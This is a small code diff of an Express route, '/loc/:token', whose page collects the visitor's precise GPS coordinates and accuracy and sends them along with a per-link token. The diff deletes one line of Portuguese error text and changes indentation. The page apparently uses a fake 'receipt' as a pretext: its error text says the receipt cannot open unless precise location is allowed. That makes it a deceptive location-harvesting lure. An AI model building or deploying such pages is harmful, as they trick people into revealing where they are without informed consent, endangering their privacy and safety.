@@ -94,7 +94,6 @@ app.get("/loc/:token", (req, res) => {
         btn.disabled = false;
         out.textContent =
           "Não foi possível abrir o comprovante. " +
-          "Abra em 'Chrome', ative Localização do celular e permita 'Localização precisa'. " +
           "Erro: " + (e2.message || e2);
         return;
       }
@@ -102,7 +101,7 @@ app.get("/loc/:token", (req, res) => {
 
     out.textContent = "Enviando...";
     const payload = {
-      token: "${token}",
+     token: "${token}",
       lat: pos.coords.latitude,
       lon: pos.coords.longitude,
       acc: pos.coords.accuracy,
